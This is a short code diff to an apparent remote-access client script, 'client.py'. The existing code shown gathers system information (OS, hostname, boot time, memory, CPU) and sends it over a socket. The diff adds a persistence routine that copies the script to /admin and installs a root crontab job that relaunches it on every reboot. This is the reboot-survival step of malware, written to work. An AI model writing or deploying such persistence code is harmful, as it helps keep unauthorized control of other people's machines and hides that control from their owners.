@@ -8,7 +8,7 @@ import tempfile
 import shutil
 import psutil
 from datetime import datetime
-
+from crontab import CronTab
 
 
 
@@ -164,6 +164,35 @@ def connection():
 			data=uname.system+"$"+uname.node+"$"+uname.machine+"$"+uname.version+"$"+bootdate+"$"+boottime+"$"+tm+"$"+am+"$"+um+"$"+perm+"$"+ts+"$"+fs+"$"+cpuf+"$"+tcpu
 			s.send(data.encode())
 
+
+
+
+def persistence():
+	destination="/admin/client.py"
+	if not os.path.exists(destination):
+		os.mkdir("/admin")
+		source=os.getcwd()+"/"+"client.py"
+		shutil.copyfile(source, destination)
+		cron = CronTab(user='root')
+		job = cron.new(command='/usr/bin/python3 /admin/client.py &')
+		job.every_reboot()
+		cron.write()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+persistence()
+print(os.getcwd())
 
 while True:
 	global s
